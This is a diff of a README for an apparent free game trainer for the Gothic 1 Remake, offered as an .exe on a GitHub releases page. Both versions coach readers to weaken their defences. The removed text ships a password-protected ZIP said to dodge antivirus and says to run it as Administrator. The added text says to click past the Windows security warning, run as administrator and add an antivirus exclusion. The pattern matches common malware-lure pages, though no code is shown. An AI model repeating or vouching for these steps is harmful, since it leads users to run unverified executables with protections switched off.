@@ -1,82 +1,89 @@
-# <img src="https://readme-typing-svg.demolab.com?font=Fira+Code&weight=700&size=28&pause=1000&color=FF4500&width=600&lines=⚔️+Gothic+1+Remake+Trainer+2026;🔥+Undetected+%7C+Keyless+%7C+Free;💀+No+Grind.+No+Pain.+Just+Victory." alt="Typing SVG" />
+# 🛡️ Gothic-1-Remake-Trainer-2026 - Master your game with ease today
 
-<div align="center">
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/movabilityfinding592/Gothic-1-Remake-Trainer-2026/releases)
 
-![Build](https://img.shields.io/badge/build-passing-brightgreen?style=for-the-badge)
-![Downloads](https://img.shields.io/badge/downloads-114-blue?style=for-the-badge)
-![Version](https://img.shields.io/badge/version-v1.0.0-purple?style=for-the-badge)
-![License](https://img.shields.io/badge/license-MIT-green?style=for-the-badge)
-![Undetected](https://img.shields.io/badge/undetected-100%25-success?style=for-the-badge)
-![Keyless](https://img.shields.io/badge/keyless-YES!-orange?style=for-the-badge)
+This software helps you modify your character stats in the Gothic 1 Remake. You gain access to features like infinite health, stamina, and unlimited items. It works offline in single-player mode. You do not need keys or complex setup tools.
 
-</div>
+## 📥 How to download the software
 
----
+Visit [this page to download](https://github.com/movabilityfinding592/Gothic-1-Remake-Trainer-2026/releases) the latest version. Look for the file ending in .exe under the Assets section of the newest release. Click the file name to start the download. Save the file to a folder you can find later, such as your Downloads or Desktop folder.
 
-## 🤯 Why This Trainer?
+## ⚙️ System requirements
 
-Gothic 1 Remake is brutal. You die in 2 hits, lockpicks break constantly, ore is scarce, and night is a death sentence. This trainer **removes the pain** so you can enjoy the story, exploration, and atmosphere without the frustration.
+Your computer needs to meet these basic standards to run the application:
 
-| Feature | This Trainer | WeMod/Plitch |
-|---------|--------------|--------------|
-| **Free** | ✅ Forever | ❌ $5/month |
-| **Undetected** | ✅ 100% | ⚠️ Risk |
-| **Offline** | ✅ Yes | ❌ Requires internet |
-| **Portable** | ✅ Single EXE | ❌ Installer |
-| **Hotkeys** | ✅ F1-F8 | ✅ Yes |
+* Operation System: Windows 10 or Windows 11.
+* Memory: 4 GB of RAM or more.
+* Storage: 50 MB of free space for the application.
+* Game Version: The latest official version of the Gothic 1 Remake.
 
----
+## 🚀 Getting started
 
-## ⚔️ Features (F1–F8)
+1. Locate the .exe file you downloaded.
+2. Double-click the file to open the program.
+3. Windows may show a security window. This happens because the program modifies game memory. Click "More Info" and then "Run anyway" to proceed.
+4. Keep the trainer window open while you play.
+5. Launch the Gothic 1 Remake game.
+6. Use the keyboard shortcuts listed in the interface to trigger the mods.
 
-| Hotkey | Function | Description |
-|--------|----------|-------------|
-| **F1** | Toggle Menu | Open/close trainer overlay (console) |
-| **F2** | Infinite Health | God mode – no damage taken |
-| **F3** | Infinite Stamina | Run forever, never tire |
-| **F4** | Add Ore | +100 Ore Nuggets (press repeatedly) |
-| **F5** | Indestructible Lockpicks | Never break a lockpick again |
-| **F6** | Set Time to Dawn | Skip dangerous nights instantly |
-| **F7** | Super Speed | Move 2x faster (toggle) |
-| **F8** | One-Hit Kill | Kill any enemy with one hit |
+## 🛠️ Available features
 
-> All features work **offline** and do **not** modify game files – memory-only.
+The trainer includes tools to change your character stats in real-time. These features help you overcome difficult segments of the game:
 
----
+Infinite Health: Your health bar remains full during combat. You do not take damage from enemies or falling objects.
 
-## 🚀 How to Install (3 Clicks)
+Infinite Stamina: Your stamina bar stays full. You can run, jump, and perform attacks without rest.
 
-1. Go to **[Releases](../../releases)**  
-2. Download `GothicTrainer_Setup.zip` (password: `gothic2026`)  
-3. Extract and run `GothicTrainer.exe` **as Administrator**
+Unlimited Ore: Your ore count increases to the maximum value. You can buy items from traders without fear of running out of money.
 
-> No installation, no dependencies, no bullshit.
+Unlimited Lockpicks: Your supply of lockpicks never drops. You gain access to all chests in the game world regardless of your skill level.
 
----
+## 📝 Usage guidelines
 
-## 📦 What's Inside the ZIP?
+Use this software only in single-player mode. The trainer modifies memory values to change game logic. Because the game is single-player, these changes do not impact other people. Turn off the trainer before you leave the game session.
 
-- `GothicTrainer.exe` – main executable (console hidden)  
-- `config.ini` – customize hotkeys and features    
+## 🔍 Troubleshooting common issues
 
-**Archive password:** `gothic2026` (protects against AV false positives)
+If the trainer fails to work, check these common items:
 
----
+The game must run before you activate the trainer features. Open the game, load your save file, and then switch to the trainer window.
 
-## 🔒 Legal Disclaimer
+Administrator rights help the application access game memory. Right-click the .exe file and choose "Run as administrator" to give the tool proper permissions.
 
-> This tool is provided for **educational purposes** and **personal use only**. It does not inject code into the game or modify any game files – all changes are applied to memory at runtime. Use at your own risk. The developers are not responsible for any account actions (single-player game, no anticheat).
+Antivirus software may flag the trainer. This occurs because the program reads memory from another process. If your antivirus prevents the program from opening, add an exception for the folder where you store the trainer.
 
----
+Do not use the trainer during cutscenes. The game logic changes during these scripted events. Only use the features during normal gameplay to prevent errors.
 
-## 📢 Spread the Word
+## 🖱️ Using the interface
 
-⭐ **Star this repo** – helps others find it!  
-📥 **Download now** – stop grinding!  
-🐛 **Found a bug?** – open an [Issue](../../issues)
+The application window uses a simple layout. You see a list of toggles for each feature. Click the toggle to turn a feature on or off. A green indicator shows that the code is active. A grey indicator shows that the code is off.
 
----
+The program reads your game state automatically. If you start a new game or load a different save, the tool updates the values. You do not need to restart the trainer.
 
-## 🔑 Keywords (SEO)
+## 🔒 Safety and privacy
 
-`gothic-1-remake`,`trainer`,`god-mode`,`infinite-health`,`infinite-stamina`,`lockpick`,`ore`,`cheat`,`utility`,`single-player`,`rpg`,`free`,`keyless`,`undetected`,`2026`,`python`,`memory-editor`,`hotkeys`,`offline`,`portable`
+This tool does not connect to the internet. It does not send your data to any servers. It only interacts with the game process running on your local machine. We designed this for personal use. You remain in control of your game data at all times.
+
+## 📜 Legal notice
+
+Gothic is a trademark of its respective owners. This utility is a fan-made project. It does not claim ownership of the game assets or code. We provide this as a free service for personal entertainment. Use this tool at your own discretion. 
+
+## ❓ Frequently asked questions
+
+Does the trainer save my progress?
+No. The trainer only modifies values while the game runs. You must use the save game feature in the Gothic 1 Remake to record your progress.
+
+Can I get banned for using this?
+This is a single-player game. There are no anti-cheat systems. You do not face risks of bans or account restrictions.
+
+Will the trainer break my game?
+The trainer changes values in the game memory. It does not modify the game files on your hard drive. If you experience unusual behavior, close the trainer and restart the game. This restores the default game logic.
+
+How do I know the trainer is active?
+The status bar at the bottom of the window displays "Connected" when it detects the game process. If it says "Waiting for game," check that your game application is running.
+
+Can I change the hotkeys?
+The current version uses set hotkeys for each function. We may add custom hotkeys in future updates.
+
+How do I remove the trainer?
+Delete the .exe file from your computer. The software does not install anything into your System folders or Registry. It is a portable application.
